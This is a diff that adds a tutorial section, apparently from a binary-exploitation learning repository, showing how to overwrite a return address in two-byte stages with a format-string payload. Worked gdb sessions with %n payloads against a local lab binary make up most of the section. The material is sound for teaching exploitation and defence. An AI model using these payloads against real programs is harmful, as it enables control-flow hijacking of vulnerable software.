@@ -434,3 +434,119 @@ gs             0x63                0x63
 ```
 
 You see that the program executes the main function a second time.
+
+## Writing in several stages
+
+Okay, in the previous subsection, I showed you how to overwrite the return address. But sometimes there are cases when we can't write desired address in one step. At this moment, it's time to write in several stages.
+
+Let's overwrite the address as above, but with several stages.
+
+Firstly, you need to understand how to specify the address at the beginning of the input string. If we want to overwrite the address in the several stages, we need to write by 2 bytes or by 1 byte at a time. For instance, consider that we want to write to the address `0xffffcfdc`, but we can't do it in one step. Though we can write first to the address `0xffffcfdc` 2 bytes, then to the address `0xffffcfdc` + 0x2, but so, that we don't change the value of the previous 2 bytes. With 1 byte at a time writing there will be `0xffffcfdc`, `0xffffcfdc` + 0x1, `0xffffcfdc` + 0x2, `0xffffcfdc` + 0x3.
+
+I will show you the 2 steps of writing. We need to write the value `0x080491b6`. So, the first value to write is `0x91b6`. The second is `0x0804`.
+
+```bash
+$ python3
+Python 3.8.5 (default, Jan 27 2021, 15:41:15)
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 0x91b6
+37302
+>>>
+```
+
+```bash
+gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "%37298u" + "%6$n"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "%37298u" + "%6$n"')
+
+gef➤  x/50wx $esp
+0xffffcfdc:	0x000091b6	0x00000002	0xffffd074	0xffffd080
+0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
+0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
+0xffffd00c:	0xf7fa8000	0x00000000	0x8da201d0	0xc94087c0
+0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
+0xffffd02c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
+0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
+0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
+0xffffd05c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd06c
+0xffffd06c:	0x0000001c	0x00000002	0xffffd246	0xffffd28b
+0xffffd07c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
+0xffffd08c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
+0xffffd09c:	0xffffd3a2	0xffffd3b8
+gef➤  
+```
+
+So, we wrote the value `0x91b6`.
+
+```bash
+>>> 0x0804
+2052
+>>>
+```
+
+```bash
+gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%2052u" + "%7$n"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%2052u" + "%7$n"')
+��������
+
+gef➤  x/50wx $esp
+0xffffcfcc:	0xf7ddbee5	0x00000002	0xffffd064	0xffffd070
+0xffffcfdc:	0x99ba91b6	0xf7fa0000	0x00000000	0xffffd048
+0xffffcfec:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
+0xffffcffc:	0xf7fa8000	0x00000000	0x2694ebfe	0x62760dee
+0xffffd00c:	0x00000000	0x00000000	0x00000000	0x00000002
+0xffffd01c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
+0xffffd02c:	0x0804c000	0x00000002	0x080490a0	0x00000000
+0xffffd03c:	0x080490d6	0x080491b6	0x00000002	0xffffd064
+0xffffd04c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd05c
+0xffffd05c:	0x0000001c	0x00000002	0xffffd238	0xffffd27d
+0xffffd06c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
+0xffffd07c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
+0xffffd08c:	0xffffd3a2	0xffffd3b8
+```
+
+You can see that I added a second address that is shifted on 2 bytes. Next, decrease the value `37298` on 4 bytes, cause the n specifier will write the number of bytes which we wrote before and we wrote an additional 4 bytes. Next, after the `%6$n` I added a new `%u` specifier and after it `%7$n` so, the program will write to the next address after the first address. Also, you can see that the program contains the value `0x99ba91b6` at the address `0xffffcfdc`.
+
+We wrote to this address value 37294 + 2052 + 8 bytes as 2 address = `0x99ba`. Thus, we can't write another 2 bytes too easily. Need to overflow the value `0xffff` and then write the value `0x0804`. `0xffff` + `0x0804` - `0x91b6` - `0x8` = `30285`. With a little guess it is easy to determine the true value in the second `u` specifier.
+
+```bash
+gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%30285u" + "%7$n"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%30285u" + "%7$n"')
+��������
+
+gef➤  x/50wx $esp
+0xffffcfcc:	0xf7ddbee5	0x00000002	0xffffd064	0xffffd070
+0xffffcfdc:	0x080391b6	0xf7fa0001	0x00000000	0xffffd048
+0xffffcfec:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
+0xffffcffc:	0xf7fa8000	0x00000000	0xa6c21c38	0xe220fa28
+0xffffd00c:	0x00000000	0x00000000	0x00000000	0x00000002
+0xffffd01c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
+0xffffd02c:	0x0804c000	0x00000002	0x080490a0	0x00000000
+0xffffd03c:	0x080490d6	0x080491b6	0x00000002	0xffffd064
+0xffffd04c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd05c
+0xffffd05c:	0x0000001c	0x00000002	0xffffd237	0xffffd27c
+0xffffd06c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
+0xffffd07c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
+0xffffd08c:	0xffffd3a2	0xffffd3b8
+gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%30286u" + "%7$n"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%30286u" + "%7$n"')
+��������
+
+gef➤  x/50wx $esp
+0xffffcfcc:	0xf7ddbee5	0x00000002	0xffffd064	0xffffd070
+0xffffcfdc:	0x080491b6	0xf7fa0001	0x00000000	0xffffd048
+0xffffcfec:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
+0xffffcffc:	0xf7fa8000	0x00000000	0x3b43ec89	0x7fa10a99
+0xffffd00c:	0x00000000	0x00000000	0x00000000	0x00000002
+0xffffd01c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
+0xffffd02c:	0x0804c000	0x00000002	0x080490a0	0x00000000
+0xffffd03c:	0x080490d6	0x080491b6	0x00000002	0xffffd064
+0xffffd04c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd05c
+0xffffd05c:	0x0000001c	0x00000002	0xffffd237	0xffffd27c
+0xffffd06c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
+0xffffd07c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
+0xffffd08c:	0xffffd3a2	0xffffd3b8
+gef➤  
+```
+
+Thus, we wrote the desirable value to this address.
